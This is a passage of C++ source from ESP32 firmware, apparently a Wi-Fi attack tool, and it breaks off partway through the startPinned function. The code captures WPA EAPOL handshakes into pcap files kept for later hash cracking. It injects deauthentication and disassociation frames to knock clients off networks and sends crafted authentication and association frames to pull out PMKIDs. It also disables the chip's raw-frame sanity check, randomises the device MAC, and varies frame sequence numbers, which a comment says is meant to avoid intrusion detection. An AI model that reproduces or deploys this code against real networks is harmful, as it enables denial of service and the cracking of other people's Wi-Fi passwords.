// cap/sniffer.cpp
// Promiscuous EAPOL capture -> one classic pcap per BSSID.

#include "sniffer.h"
#include "pcap.h"
#include "hc22000.h"
#include "capture_name.h"
#include "methods/method_ctx.h"
#include "../storage/littlefs_ops.h"
#include "../net/ap_sta.h"
#include "../core/config.h"
#include "../core/xp.h"
#include "../core/wsl_bypasser.h"
#include <esp_wifi.h>
#include <esp_random.h>
#include <WiFi.h>
#include <SD.h>
#include <string.h>
#include <stdio.h>

extern "C" int ieee80211_raw_frame_sanity_check(int32_t, int32_t, int32_t) {
    return 0;
}

namespace Cap {

static const uint16_t FRAME_MAX = 512;
static const uint8_t  RING_SLOTS = 12;
static const uint32_t MAX_FILE_SIZE = 50 * 1024;
static const uint16_t MAX_FILES = 200;
static const uint8_t HOP_ALL[]  = {1, 6, 11, 2, 3, 4, 5, 7, 8, 9, 10, 12, 13};
static const uint8_t HOP_CORE[] = {1, 6, 11};

struct Slot {
    uint8_t  bssid[6];
    uint8_t  station[6];
    uint16_t len;
    uint32_t ts;
    int8_t   rssi;
    uint8_t  channel;
    uint8_t  frame[FRAME_MAX];
};

static Slot s_ring[RING_SLOTS];
static volatile uint8_t s_write = 0;
static volatile uint8_t s_read  = 0;

static File     s_file;
static uint8_t  s_fileBssid[6];
static uint8_t  s_lastHsBssid[6];
static bool     s_fileOpen = false;
static uint32_t s_fileSize = 0;
static char     s_fileName[Storage::FILE_NAME_MAX];
static const char* const PREFIX = "/0N3P0rK/handshakes/";

// A beacon captured while a network is still hidden has an empty SSID, so the
// pcap gets created as HIDDEN_<bssid>.pcap and — worse — Hc22000::convertPcap()
// can never derive a crackable hash from it later (WPA-PSK needs the real
// ESSID). When the real name shows up on a later beacon/probe response for a
// BSSID we already have a HIDDEN file for, we rename the file and splice the
// revealing frame in. The actual SD I/O happens in drainRing() (loop context),
// never here — storeBeacon() runs from the WiFi promiscuous callback and must
// stay allocation/I/O free.
static uint8_t  s_pendingLearnBssid[6] = {};
static bool     s_pendingLearn = false;

static const uint8_t BEACON_SLOTS = 16;
// BeaconSlot itself now lives in methods/beacon_slot.h (pulled in via
// method_ctx.h) so the capture methods can read it without depending on
// sniffer.cpp's internals.
static BeaconSlot s_beacons[BEACON_SLOTS];
static uint8_t s_beaconCount = 0;
static uint8_t s_beaconClock = 0;

static Counters s_cnt = {};
static volatile bool s_running = false;
static RunMode  s_mode = RunMode::Off;
static bool     s_hopEnabled = false;
static bool     s_deauthEnabled = false;
static uint8_t  s_channelIdx = 0;
static uint32_t s_lastHopMs = 0;
static uint8_t  s_apMac[6] = {};
static uint8_t  s_bcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
static uint8_t  s_kickSta[6] = {};
static uint8_t  s_kickBssid[6] = {};
static bool     s_kickStaOk = false;
static uint32_t s_lockUntil = 0;
static bool     s_lockOnHs = true;
static uint16_t s_lockMs = 8000;
static uint16_t s_hopMs = 300;
static int8_t   s_minRssi = -85;
static uint8_t  s_hopSet = 0;
static uint8_t  s_hsMethod = 0;
static uint8_t  s_activeMethod = 0; // 0=OURS 1=PAN
static uint8_t  s_fallbackSec = 25;
static uint8_t  s_kickBurst = 2;
static bool     s_bidirKick = true;
static bool     s_eapolTx = true;
static bool     s_pmkidProbe = true;
static bool     s_csaHerd = false;
static bool     s_authFlood = false;
static uint8_t  s_deauthReason = 7;
static bool     s_fatPcap = true;
static uint32_t s_methodStartMs = 0;
static uint16_t s_pairAtSwitch = 0;
static bool     s_pinOk = false;
static uint8_t  s_pinBssid[6] = {};
static uint8_t  s_pinCh = 6;
static char     s_pinSsid[33] = {};

static const uint8_t* hopTable(uint8_t* count) {
    if (s_hopSet == (uint8_t)HopSet::CORE) {
        *count = sizeof(HOP_CORE);
        return HOP_CORE;
    }
    *count = sizeof(HOP_ALL);
    return HOP_ALL;
}

// RSN IE layout: version(2) group(4) pairCnt(2) pair*4 akmCnt(2) akm*4 caps(2) ...
// bit6 of caps = MFPC (station/AP supports 802.11w), bit7 = MFPR (required).
// Either bit set means unauthenticated deauth/disassoc will be dropped by the AP/STA.
static bool parseRsnMfpc(const uint8_t* ie, uint8_t ielen) {
    if (ielen < 20) return false;
    uint16_t off = 2 + 4;
    if (off + 2 > ielen) return false;
    uint16_t pairCnt = (uint16_t)(ie[off] | (ie[off + 1] << 8));
    off = (uint16_t)(off + 2 + pairCnt * 4);
    if (off + 2 > ielen) return false;
    uint16_t akmCnt = (uint16_t)(ie[off] | (ie[off + 1] << 8));
    off = (uint16_t)(off + 2 + akmCnt * 4);
    if (off + 2 > ielen) return false;
    uint16_t caps = (uint16_t)(ie[off] | (ie[off + 1] << 8));
    return (caps & 0x00C0) != 0; // MFPC or MFPR
}

static bool beaconHasPmf(const uint8_t* f, uint16_t len) {
    uint16_t off = 24 + 12; // fixed beacon params
    while (off + 2 <= len) {
        uint8_t id = f[off];
        uint8_t l = f[off + 1];
        if (off + 2 + l > len) break;
        if (id == 48 && parseRsnMfpc(f + off + 2, l)) return true;
        off = (uint16_t)(off + 2 + l);
    }
    return false;
}

static BeaconSlot* findBeacon(const uint8_t* bssid) {
    for (uint8_t i = 0; i < s_beaconCount; i++) {
        if (memcmp(s_beacons[i].bssid, bssid, 6) == 0) return &s_beacons[i];
    }
    return nullptr;
}

// Method dispatch reads from Methods::table() (see methods/method_ctx.h).
// Adding a capture method = adding a row to METHOD_LIST() in method_ctx.h;
// the compiler rebuilds the table, this file doesn't need a thing.
//
// s_activeMethod is the index into that table; 0 is the default. The AUTO
// mode rotates through [1..count) after a fallback timeout, see
// maybeRotateMethod().

static uint8_t s_methodCount = 0;

static const Methods::Entry* methodTable() {
    return Methods::table(&s_methodCount);
}

static void setMethodTag() {
    const Methods::Entry* tbl = methodTable();
    uint8_t idx = s_activeMethod < s_methodCount ? s_activeMethod : 0;
    const char* n = tbl[idx].name;
    strncpy(s_cnt.methodTag, n, sizeof(s_cnt.methodTag) - 1);
    s_cnt.methodTag[sizeof(s_cnt.methodTag) - 1] = '\0';
}

static void noteClient(const uint8_t* bssid, const uint8_t* sta) {
    if (!bssid || !sta) return;
    if (sta[0] & 0x01) return;
    BeaconSlot* b = findBeacon(bssid);
    if (!b) return;
    for (uint8_t i = 0; i < b->clientN; i++) {
        if (memcmp(b->clients[i], sta, 6) == 0) return;
    }
    if (b->clientN < 4) {
        memcpy(b->clients[b->clientN], sta, 6);
        b->clientN++;
        return;
    }
    memcpy(b->clients[s_beaconClock % 4], sta, 6);
}

static bool hopLocked() {
    return s_lockUntil != 0 && millis() < s_lockUntil;
}

static void noteNetwork(const uint8_t* bssid, const char* ssid, bool force) {
    if (!bssid) return;
    if (s_pinOk && memcmp(bssid, s_pinBssid, 6) != 0) return;
    snprintf(s_cnt.currentBssid, sizeof(s_cnt.currentBssid),
             "%02X:%02X:%02X:%02X:%02X:%02X",
             bssid[0], bssid[1], bssid[2],
             bssid[3], bssid[4], bssid[5]);
    if (ssid && ssid[0]) {
        strncpy(s_cnt.currentSsid, ssid, sizeof(s_cnt.currentSsid) - 1);
        s_cnt.currentSsid[sizeof(s_cnt.currentSsid) - 1] = '\0';
    } else if (force) {
        s_cnt.currentSsid[0] = '\0';
    }
}

static void ssidForBssid(const uint8_t* bssid, char out[33]) {
    out[0] = '\0';
    const BeaconSlot* bcn = findBeacon(bssid);
    if (bcn && bcn->ssid[0]) {
        strncpy(out, bcn->ssid, 32);
        out[32] = '\0';
        return;
    }
    if (bcn) CapName::ssidFromMgmt(bcn->frame, bcn->len, out);
}

static void storeBeacon(const uint8_t* bssid, const uint8_t* f, uint16_t len, int8_t rssi) {
    if (!bssid || !f || len < 24) return;
    if (len > BEACON_MAX) len = BEACON_MAX;
    char ssid[33];
    CapName::ssidFromMgmt(f, len, ssid);
    for (uint8_t i = 0; i < s_beaconCount; i++) {
        if (memcmp(s_beacons[i].bssid, bssid, 6) == 0) {
            memcpy(s_beacons[i].frame, f, len);
            s_beacons[i].len = len;
            s_beacons[i].channel = s_cnt.currentChannel;
            s_beacons[i].rssi = rssi;
            s_beacons[i].pmfCapable = beaconHasPmf(f, len);
            bool learned = ssid[0] && !s_beacons[i].ssid[0];
            if (ssid[0]) strncpy(s_beacons[i].ssid, ssid, sizeof(s_beacons[i].ssid) - 1);
            if (learned) {
                Hc22000::feed(f, len);
                memcpy(s_pendingLearnBssid, bssid, 6);
                s_pendingLearn = true;
            }
            if (ssid[0] && memcmp(bssid, s_lastHsBssid, 6) == 0) {
                strncpy(s_cnt.lastHsSsid, ssid, sizeof(s_cnt.lastHsSsid) - 1);
                s_cnt.lastHsSsid[sizeof(s_cnt.lastHsSsid) - 1] = '\0';
                noteNetwork(bssid, ssid, true);
            } else if (!hopLocked()) {
                noteNetwork(bssid, s_beacons[i].ssid, false);
            }
            return;
        }
    }
    uint8_t idx;
    if (s_beaconCount < BEACON_SLOTS) {
        idx = s_beaconCount++;
    } else {
        idx = s_beaconClock++ % BEACON_SLOTS;
    }
    memset(&s_beacons[idx], 0, sizeof(s_beacons[idx]));
    memcpy(s_beacons[idx].bssid, bssid, 6);
    memcpy(s_beacons[idx].frame, f, len);
    s_beacons[idx].len = len;
    s_beacons[idx].channel = s_cnt.currentChannel;
    s_beacons[idx].rssi = rssi;
    s_beacons[idx].pmfCapable = beaconHasPmf(f, len);
    if (ssid[0]) strncpy(s_beacons[idx].ssid, ssid, sizeof(s_beacons[idx].ssid) - 1);
    if (!hopLocked()) noteNetwork(bssid, s_beacons[idx].ssid, false);
    Hc22000::feed(f, len);
}

static void IRAM_ATTR promiscuousRxCb(void* buf, wifi_promiscuous_pkt_type_t type) {
    const wifi_promiscuous_pkt_t* pkt = (const wifi_promiscuous_pkt_t*)buf;
    if (!pkt || !s_running) return;

    uint16_t len = pkt->rx_ctrl.sig_len;
    if (len > 4) len -= 4;
    if (len < 24) return;

    s_cnt.framesSeen++;
    const uint8_t* f = pkt->payload;

    if (type == WIFI_PKT_MGMT) {
        uint8_t fc = f[0] & 0xFC;
        if (fc == 0x80 || fc == 0x50) {
            storeBeacon(f + 16, f, len, (int8_t)pkt->rx_ctrl.rssi);
        } else if (fc == 0x10) {
            Hc22000::feed(f, len);
        }
        return;
    }
    if (type != WIFI_PKT_DATA) return;
    if ((f[0] & 0x0C) != 0x08) return;

    uint8_t toDs = (f[1] & 0x01) != 0;
    uint8_t fromDs = (f[1] & 0x02) != 0;

    const uint8_t* bssid = nullptr;
    const uint8_t* station = nullptr;
    uint16_t bodyOff = 24;
    if (toDs && !fromDs) {
        bssid   = f + 4;
        station = f + 10;
    } else if (!toDs && fromDs) {
        bssid   = f + 10;
        station = f + 4;
    } else if (toDs && fromDs) {
        // WDS / 4-address — Porkchop still looks for EAPOL here.
        bssid   = f + 16;
        station = f + 10;
        bodyOff = 30;
    } else {
        bssid   = f + 16;
        station = f + 10;
    }

    uint8_t subtype = (f[0] >> 4) & 0x0F;
    bool isQos = (subtype & 0x08) != 0;
    if (isQos) bodyOff += 2;
    if (isQos && (f[1] & 0x80)) bodyOff += 4;

    if (bssid && station) noteClient(bssid, station);

    bool eapol = false;
    if (bodyOff + 8 <= len &&
        f[bodyOff] == 0xAA && f[bodyOff + 1] == 0xAA && f[bodyOff + 2] == 0x03 &&
        f[bodyOff + 6] == 0x88 && f[bodyOff + 7] == 0x8E) {
        eapol = true;
    }
    if (!eapol) {
        uint16_t lim = len;
        for (uint16_t i = bodyOff; i + 1 < lim; i++) {
            if (f[i] == 0x88 && f[i + 1] == 0x8E) { eapol = true; break; }
        }
    }
    if (!eapol) return;
    if (s_pinOk && bssid && memcmp(bssid, s_pinBssid, 6) != 0) return;

    s_cnt.framesEapol++;
    if (s_lockOnHs && s_lockMs > 0) {
        s_lockUntil = millis() + s_lockMs;
    }

    uint8_t next = (uint8_t)((s_write + 1) % RING_SLOTS);
    if (next == s_read) {
        s_cnt.framesDropped++;
        return;
    }
    Slot& s = s_ring[s_write];
    memcpy(s.bssid, bssid, 6);
    memcpy(s.station, station, 6);
    s.len = (len > FRAME_MAX) ? FRAME_MAX : len;
    s.ts  = millis();
    s.rssi = (int8_t)pkt->rx_ctrl.rssi;
    s.channel = s_cnt.currentChannel;
    memcpy(s.frame, f, s.len);
    s_write = next;
    s_cnt.framesQueued++;
}

static void makeFilename(const uint8_t* bssid, char out[Storage::FILE_NAME_MAX]) {
    char ssid[33];
    ssidForBssid(bssid, ssid);
    char stem[40];
    CapName::buildStem(ssid, bssid, stem, sizeof(stem));
    snprintf(out, Storage::FILE_NAME_MAX, "%s.pcap", stem);
}

static bool writePcapPacket(const uint8_t* frame, uint16_t flen, uint32_t ts, uint8_t ch, int8_t rssi) {
    uint8_t rt[Pcap::RADIOTAP_FAT_LEN];
    uint8_t rtLen = Pcap::buildRadiotap(rt, ch ? ch : s_cnt.currentChannel, rssi, s_fatPcap);
    Pcap::PacketHeader ph;
    ph.tsSec   = ts / 1000;
    ph.tsUsec  = (ts % 1000) * 1000;
    ph.inclLen = rtLen + flen;
    ph.origLen = ph.inclLen;
    size_t n = 0;
    n += s_file.write((uint8_t*)&ph, sizeof(ph));
    n += s_file.write(rt, rtLen);
    n += s_file.write(frame, flen);
    size_t expect = sizeof(ph) + rtLen + flen;
    if (n != expect) return false;
    s_fileSize += expect;
    return true;
}

static void closeFile() {
    if (s_fileOpen) {
        s_file.flush();
        s_file.close();
        s_fileOpen = false;
    }
}

static bool openFileForBssid(const uint8_t* bssid) {
    if (s_fileOpen) closeFile();

    Storage::Stats st = Storage::stats();
    char name[Storage::FILE_NAME_MAX];
    makeFilename(bssid, name);
    char path[80];
    snprintf(path, sizeof(path), "%s%s", PREFIX, name);

    bool exists = SD.exists(path);
    if (!exists && st.handshakes >= MAX_FILES) {
        Serial.println("[CAP] handshake cap (200 files) reached");
        return false;
    }

    s_file = SD.open(path, "a");
    if (!s_file) return false;

    s_fileSize = s_file.size();
    bool createdNew = false;
    if (s_fileSize >= MAX_FILE_SIZE) {
        s_file.close();
        return false;
    }

    if (s_fileSize == 0) {
        Pcap::FileHeader fh;
        fh.magic        = 0xA1B2C3D4;
        fh.versionMajor = 2;
        fh.versionMinor = 4;
        fh.thiszone     = 0;
        fh.sigfigs      = 0;
        fh.snaplen      = 65535;
        fh.linktype     = 127;
        if (s_file.write((uint8_t*)&fh, sizeof(fh)) != sizeof(fh)) {
            s_file.close();
            return false;
        }
        s_fileSize = sizeof(fh);
        s_cnt.filesOpened++;
        createdNew = true;
        XP::addXP(XPEvent::HANDSHAKE);
    }

    memcpy(s_fileBssid, bssid, 6);
    memcpy(s_fileName, name, sizeof(s_fileName));
    s_fileOpen = true;

    char ssid[33];
    ssidForBssid(bssid, ssid);
    if (ssid[0]) CapName::writeCompanionSsid(Storage::DIR_HS, name, ssid);

    const BeaconSlot* bcn = findBeacon(bssid);
    if (bcn && (createdNew || s_fileSize < 80)) {
        writePcapPacket(bcn->frame, bcn->len, millis(), bcn->channel, bcn->rssi);
        Hc22000::feed(bcn->frame, bcn->len);
    }
    return true;
}

static bool sameBssid(const uint8_t* a, const uint8_t* b) {
    return memcmp(a, b, 6) == 0;
}

static void writeFrameToFile(const Slot& s) {
    if (s_fileOpen && !sameBssid(s_fileBssid, s.bssid)) {
        closeFile();
    }
    if (s_fileOpen && s_fileSize >= MAX_FILE_SIZE) {
        closeFile();
    }
    if (!s_fileOpen) {
        if (!openFileForBssid(s.bssid)) return;
    }
    if (!writePcapPacket(s.frame, s.len, s.ts, s.channel, s.rssi)) {
        s_cnt.framesDropped++;
        closeFile();
        return;
    }
    s_cnt.framesWritten++;
    Hc22000::feed(s.frame, s.len);
    memcpy(s_kickBssid, s.bssid, 6);
    memcpy(s_kickSta, s.station, 6);
    s_kickStaOk = (s.station[0] & 0x01) == 0;
    char ssid[33];
    ssidForBssid(s.bssid, ssid);
    memcpy(s_lastHsBssid, s.bssid, 6);
    noteNetwork(s.bssid, ssid, true);
    if (ssid[0]) {
        strncpy(s_cnt.lastHsSsid, ssid, sizeof(s_cnt.lastHsSsid) - 1);
        s_cnt.lastHsSsid[sizeof(s_cnt.lastHsSsid) - 1] = '\0';
        CapName::writeCompanionSsid(Storage::DIR_HS, s_fileName, ssid);
    }
}

// Runs from loop() context (via drainRing) — safe to do SD I/O here.
static void processPendingSsidLearn() {
    if (!s_pendingLearn) return;
    s_pendingLearn = false;

    uint8_t bssid[6];
    memcpy(bssid, s_pendingLearnBssid, 6);
    const BeaconSlot* b = findBeacon(bssid);
    if (!b || !b->ssid[0]) return;

    char hiddenStem[40], hiddenName[Storage::FILE_NAME_MAX], hiddenPath[80];
    CapName::buildStem("", bssid, hiddenStem, sizeof(hiddenStem));
    snprintf(hiddenName, sizeof(hiddenName), "%s.pcap", hiddenStem);
    snprintf(hiddenPath, sizeof(hiddenPath), "%s%s", PREFIX, hiddenName);
    if (!SD.exists(hiddenPath)) return; // nothing was ever written under HIDDEN

    // Same file we're actively streaming into — close it before renaming.
    if (s_fileOpen && sameBssid(s_fileBssid, bssid)) closeFile();

    char newName[Storage::FILE_NAME_MAX], newPath[80];
    makeFilename(bssid, newName);
    snprintf(newPath, sizeof(newPath), "%s%s", PREFIX, newName);
    if (strcmp(hiddenPath, newPath) == 0) return; // name didn't actually change
    if (SD.exists(newPath)) return;               // don't clobber an existing file

    if (!SD.rename(hiddenPath, newPath)) {
        Serial.printf("[CAP] rename %s -> %s failed\n", hiddenName, newName);
        return;
    }
    Serial.printf("[CAP] %s -> %s (ssid learned)\n", hiddenName, newName);

    // Splice the SSID-revealing frame into the renamed pcap. Without this,
    // Hc22000::convertPcap() run later on this file would still see nothing
    // but the original hidden beacon and could never rebuild a crackable hash.
    File f = SD.open(newPath, "a");
    if (!f) return;
    uint8_t rt[Pcap::RADIOTAP_FAT_LEN];
    uint8_t rtLen = Pcap::buildRadiotap(rt, b->channel, b->rssi, s_fatPcap);
    Pcap::PacketHeader ph;
    uint32_t ts = millis();
    ph.tsSec   = ts / 1000;
    ph.tsUsec  = (ts % 1000) * 1000;
    ph.inclLen = (uint32_t)(rtLen + b->len);
    ph.origLen = ph.inclLen;
    f.write((uint8_t*)&ph, sizeof(ph));
    f.write(rt, rtLen);
    f.write(b->frame, b->len);
    f.close();
}

static void drainRing() {
    while (s_read != s_write) {
        const Slot& s = s_ring[s_read];
        writeFrameToFile(s);
        s_read = (uint8_t)((s_read + 1) % RING_SLOTS);
    }
    if (s_fileOpen) s_file.flush();
    processPendingSsidLearn();
}

static bool isOwnAp(const uint8_t* bssid) {
    return memcmp(bssid, s_apMac, 6) == 0;
}

static bool skipPin(const uint8_t* bssid) {
    return s_pinOk && memcmp(bssid, s_pinBssid, 6) != 0;
}

// Per-BSSID sequence counter for injected mgmt frames. A static seq=0 on every
// frame is an easy tell for a WIDS/packet capture and some APs rate-limit or
// drop obviously-replayed sequence numbers; incrementing per destination
// mimics a real, ongoing 802.11 session.
struct SeqEntry { uint8_t bssid[6]; uint16_t seq; bool used; };
static SeqEntry s_seqTable[16];

static uint16_t nextSeq(const uint8_t* bssid) {
    for (uint8_t i = 0; i < 16; i++) {
        if (s_seqTable[i].used && memcmp(s_seqTable[i].bssid, bssid, 6) == 0) {
            s_seqTable[i].seq = (uint16_t)((s_seqTable[i].seq + 1) & 0x0FFF);
            return s_seqTable[i].seq;
        }
    }
    for (uint8_t i = 0; i < 16; i++) {
        if (!s_seqTable[i].used) {
            memcpy(s_seqTable[i].bssid, bssid, 6);
            s_seqTable[i].seq = (uint16_t)(esp_random() & 0x0FFF);
            s_seqTable[i].used = true;
            return s_seqTable[i].seq;
        }
    }
    return (uint16_t)(esp_random() & 0x0FFF);
}

static void sendRawMgmt(uint8_t fc0, const uint8_t* bssid, const uint8_t* dest) {
    uint8_t pkt[26] = {
        fc0, 0x00,
        0x00, 0x00,
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00,
        0x07, 0x00
    };
    memcpy(pkt + 4, dest, 6);
    memcpy(pkt + 10, bssid, 6);
    memcpy(pkt + 16, bssid, 6);
    uint16_t seq = nextSeq(bssid);
    pkt[22] = (uint8_t)((seq << 4) & 0xF0);
    pkt[23] = (uint8_t)((seq >> 4) & 0xFF);
    pkt[24] = s_deauthReason;
    esp_err_t e = esp_wifi_80211_tx(WIFI_IF_AP, pkt, sizeof(pkt), false);
    if (e != ESP_OK) e = esp_wifi_80211_tx(WIFI_IF_STA, pkt, sizeof(pkt), false);
    if (e == ESP_OK) s_cnt.framesDeauth++;
}

static Methods::Ctx buildMethodCtx() {
    Methods::Ctx ctx{};
    ctx.beacons      = s_beacons;
    ctx.beaconCount   = s_beaconCount;
    ctx.channel       = s_cnt.currentChannel;
    ctx.minRssi       = s_minRssi;
    ctx.kickBurst     = s_kickBurst;
    ctx.deauthReason  = s_deauthReason;
    ctx.bidirKick     = s_bidirKick;
    ctx.eapolTx       = s_eapolTx;
    ctx.pmkidProbe    = s_pmkidProbe;
    ctx.csaHerd       = s_csaHerd;
    ctx.authFlood     = s_authFlood;
    ctx.kickBssid     = s_kickBssid;
    ctx.kickSta       = s_kickSta;
    ctx.kickStaOk     = s_kickStaOk;
    ctx.bcast         = s_bcast;
    ctx.isOwnAp       = isOwnAp;
    ctx.skipPin       = skipPin;
    ctx.sendRawMgmt   = sendRawMgmt;
    ctx.framesDeauth  = &s_cnt.framesDeauth;
    return ctx;
}

static void kickOnThisChannel() {
    if (!s_deauthEnabled) return;
    if (Hc22000::shouldPauseDeauth()) return;
    const Methods::Entry* tbl = methodTable();
    uint8_t idx = s_activeMethod < s_methodCount ? s_activeMethod : 0;
    const Methods::Entry& m = tbl[idx];
    if (s_pinOk) {
        bool seen = false;
        for (uint8_t i = 0; i < s_beaconCount; i++) {
            if (memcmp(s_beacons[i].bssid, s_pinBssid, 6) == 0) { seen = true; break; }
        }
        if (!seen) {
            uint8_t rounds = s_kickBurst ? s_kickBurst : 1;
            for (uint8_t r = 0; r < rounds; r++) {
                sendRawMgmt(0xC0, s_pinBssid, s_bcast);
                sendRawMgmt(0xA0, s_pinBssid, s_bcast);
            }
            if (m.probe && s_pmkidProbe && s_pinSsid[0] &&
                !Hc22000::hasPair(s_pinBssid)) {
                WSLBypasser::sendAuthentication(s_pinBssid);
                WSLBypasser::sendAssociationRequest(s_pinBssid, s_pinSsid);
            }
        }
    }
    Methods::Ctx ctx = buildMethodCtx();
    m.kick(ctx);
    if (m.probe) m.probe(ctx);
}

static void maybeRotateMethod() {
    if (s_hsMethod != (uint8_t)HsMethod::AUTO) return;
    if (s_methodCount < 2) return; // nothing to rotate through
    uint16_t pairs = Hc22000::pairCount();
    if (pairs > s_pairAtSwitch) {
        s_pairAtSwitch = pairs;
        s_methodStartMs = millis();
        return;
    }
    uint32_t waitMs = (uint32_t)s_fallbackSec * 1000u;
    if (waitMs < 10000) waitMs = 10000;
    if (millis() - s_methodStartMs < waitMs) return;
    // AUTO rotates only between OURS and PAN — the two real capture
    // methods. CSA is a herd trick driven by r.csaHerd, not a stand-alone
    // capture strategy, so it stays out of the rotation and never lands on
    // M: in the status bar.
    static const char* const kAutoCycle[] = { "OURS", "PAN" };
    static const uint8_t kAutoCycleLen = sizeof(kAutoCycle) / sizeof(kAutoCycle[0]);
    const char* cur = methodTable()[s_activeMethod].name;
    uint8_t step = 0;
    for (uint8_t i = 0; i < kAutoCycleLen; i++) {
        if (strcmp(cur, kAutoCycle[i]) == 0) { step = (uint8_t)(i + 1); break; }
    }
    if (step == 0) {
        // Current method isn't in the AUTO cycle (e.g. CSA). Jump to OURS.
        s_activeMethod = 0;
        for (uint8_t i = 0; i < s_methodCount; i++) {
            if (strcmp(methodTable()[i].name, "OURS") == 0) { s_activeMethod = i; break; }
        }
    } else {
        const char* next = kAutoCycle[step % kAutoCycleLen];
        for (uint8_t i = 0; i < s_methodCount; i++) {
            if (strcmp(methodTable()[i].name, next) == 0) { s_activeMethod = i; break; }
        }
    }
    s_methodStartMs = millis();
    s_pairAtSwitch = pairs;
    setMethodTag();
    Serial.printf("[CAP] AUTO switch -> %s\n", s_cnt.methodTag);
}

void begin() {
    Storage::begin();
    Storage::ensureDir(Storage::DIR_HS);
    Storage::ensureDir(Storage::DIR_WPASEC);
    Storage::ensureDir(Storage::DIR_PWNCRACK);
    s_cnt = {};
    s_write = 0;
    s_read  = 0;
    s_running = false;
    s_mode = RunMode::Off;
    s_beaconCount = 0;
    Hc22000::reset();
}

static void startCommon(RunMode mode) {
    bool sdOk = Storage::begin();
    if (!sdOk) Serial.println("[CAP] SD missing - EAPOL counted, files may fail");

    if (s_running) stop();

    s_write = 0;
    s_read = 0;
    s_cnt = {};
    memset(s_seqTable, 0, sizeof(s_seqTable));
    s_pendingLearn = false;
    s_cnt.currentBssid[0] = 0;
    s_cnt.currentSsid[0] = 0;
    s_cnt.lastHsSsid[0] = 0;
    memset(s_lastHsBssid, 0, sizeof(s_lastHsBssid));
    s_lastHopMs = millis();
    s_channelIdx = 0;
    s_lockUntil = 0;
    s_kickStaOk = false;
    s_mode = mode;
    s_hopEnabled = (mode == RunMode::Aggressive);
    s_deauthEnabled = (mode != RunMode::Light) && Config::radio().deauth;
    if (mode != RunMode::Pinned) {
        s_pinOk = false;
        memset(s_pinBssid, 0, sizeof(s_pinBssid));
        s_pinSsid[0] = 0;
    }
    s_lockOnHs = Config::radio().lockOnHs;
    s_lockMs = Config::radio().lockMs;
    s_hopMs = Config::radio().hopMs;
    s_minRssi = Config::radio().minRssi;
    s_hopSet = Config::radio().hopSet;
    s_hsMethod = Config::radio().hsMethod;
    s_fallbackSec = Config::radio().fallbackSec;
    s_kickBurst = Config::radio().kickBurst;
    s_bidirKick = Config::radio().bidirKick;
    s_eapolTx = Config::radio().eapolTx;
    s_pmkidProbe = Config::radio().pmkidProbe;
    s_csaHerd = Config::radio().csaHerd;
    s_authFlood = Config::radio().authFlood;
    s_deauthReason = Config::radio().deauthReason;
    s_fatPcap = Config::radio().fatPcap;
    // AUTO starts on table index 0 and rotates via maybeRotateMethod().
    // Explicit non-AUTO values resolve to the table row with the same name;
    // unknown names (e.g. legacy NVS value) fall back to 0 so the device
    // still boots instead of getting stuck on an out-of-range index.
    // AUTO should rotate between the two real capture methods (OURS, PAN),
    // not between every registered kick routine — CSA is a per-target herd
    // trick (driven by r.csaHerd), not a standalone capture method, and
    // sticking it into the rotation made M: in the status bar show "CSA"
    // right after starting even though the user picked AUTO expecting
    // OURS-then-PAN behaviour. Start on OURS for the same reason.
    if (s_methodCount == 0) methodTable(); // populate s_methodCount
    auto findByName = [](const char* want) -> uint8_t {
        for (uint8_t i = 0; i < s_methodCount; i++) {
            if (strcmp(methodTable()[i].name, want) == 0) return i;
        }
        return 0;
    };
    if ((HsMethod)s_hsMethod == HsMethod::AUTO) {
        s_activeMethod = findByName("OURS");
    } else {
        const char* want = nullptr;
        switch ((HsMethod)s_hsMethod) {
            case HsMethod::OURS: want = "OURS"; break;
            case HsMethod::PAN:  want = "PAN";  break;
            default: break;
        }
        s_activeMethod = want ? findByName(want) : 0;
    }
    s_methodStartMs = millis();
    s_pairAtSwitch = Hc22000::pairCount();
    Methods::resetAll();
    setMethodTag();
    if (s_hopMs < 50) s_hopMs = 50;

    // SoftAP iface must exist or 802.11 TX / promiscuous often stay dead
    // after the boot fence left WIFI_OFF.
    WiFi.persistent(false);
    WiFi.mode(WIFI_AP_STA);
    WiFi.setSleep(false);
    uint8_t hopN = 0;
    const uint8_t* hops = hopTable(&hopN);
    uint8_t startCh = 6;
    if (s_hopEnabled) startCh = hops[0];
    else if (mode == RunMode::Pinned && s_pinCh >= 1 && s_pinCh <= 13) startCh = s_pinCh;
    const char* apName = (mode == RunMode::Aggressive) ? "OneLPig AGG"
                       : (mode == RunMode::Pinned) ? "OneLPig PIN" : "OneLPig";
    if (Config::radio().randomMac) WSLBypasser::randomizeMAC();
    bool apOk = WiFi.softAP(apName, "onelpig123", startCh, 1 /* hidden */, 4);
    delay(80);
    WiFi.softAPmacAddress(s_apMac);
    Serial.printf("[CAP] wifi AP+STA hidden=%s ch=%u ap=%s\n",
                  apName, (unsigned)startCh, apOk ? "ok" : "fail");

    wifi_promiscuous_filter_t filt{};
    filt.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA;
    esp_wifi_set_promiscuous_filter(&filt);
    esp_wifi_set_promiscuous_rx_cb(&promiscuousRxCb);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_channel(startCh, WIFI_SECOND_CHAN_NONE);
    s_cnt.currentChannel = startCh;
    s_running = true;

    if (s_pinOk) {
        noteNetwork(s_pinBssid, s_pinSsid, true);
        snprintf(s_cnt.currentBssid, sizeof(s_cnt.currentBssid),
                 "%02X:%02X:%02X:%02X:%02X:%02X",
                 s_pinBssid[0], s_pinBssid[1], s_pinBssid[2],
                 s_pinBssid[3], s_pinBssid[4], s_pinBssid[5]);
    }
    Serial.printf("[CAP] %s hop=%u deauth=%u ch=%u method=%s sd=%u\n",
                  mode == RunMode::Aggressive ? "AGGRESSIVE"
                  : (mode == RunMode::Pinned ? "PINNED" : "light"),
                  (unsigned)s_hopEnabled, (unsigned)s_deauthEnabled,
                  (unsigned)s_cnt.currentChannel, s_cnt.methodTag, (unsigned)sdOk);
}

void startLight() {
    startCommon(RunMode::Light);
}

void startAggressive() {
    startCommon(RunMode::Aggressive);
}

void startPinned(uint8_t ch, const uint8_t* bssid, const char* ssid) {
    if (!bssid) return;
    s_pinOk = true;
    s_pinCh = (ch >= 1 && ch <= 13) ? ch : 6;
    memcpy(s_pinBssid, bssid, 6);
